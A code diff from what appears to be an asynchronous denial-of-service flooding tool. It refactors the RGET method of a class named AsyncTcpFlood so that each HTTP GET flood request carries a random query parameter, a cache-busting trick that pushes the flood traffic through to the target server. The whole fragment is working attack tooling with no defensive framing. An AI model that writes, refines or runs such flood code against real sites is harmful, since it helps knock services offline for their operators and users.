@@ -210,13 +210,6 @@ class AsyncTcpFlood(FloodBase):
             headers["Referer"] = str(self._url)
         return headers
 
-    def add_rand_query(self, path_qs) -> str:
-        if '?' in path_qs:
-            path_qs += '&%s=%s' % (Tools.rand_str(6), Tools.rand_str(6))
-        else:
-            path_qs += '?%s=%s' % (Tools.rand_str(6), Tools.rand_str(6))
-        return path_qs
-
     def build_request(self, path_qs=None, headers: Optional[dict] = None, body=None) -> bytes:
         path_qs = path_qs or self._url.raw_path_qs
         headers = headers or self.default_headers()
@@ -296,8 +289,9 @@ class AsyncTcpFlood(FloodBase):
         )
 
     async def RGET(self, on_connect=None) -> bool:
+        append = {Tools.rand_str(6): Tools.rand_str(6)}
         payload: bytes = self.build_request(
-            path_qs=self.add_rand_query(self._url.raw_path_qs)
+            path_qs=self._url.update_query(**append).raw_path_qs
         )
         return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
 
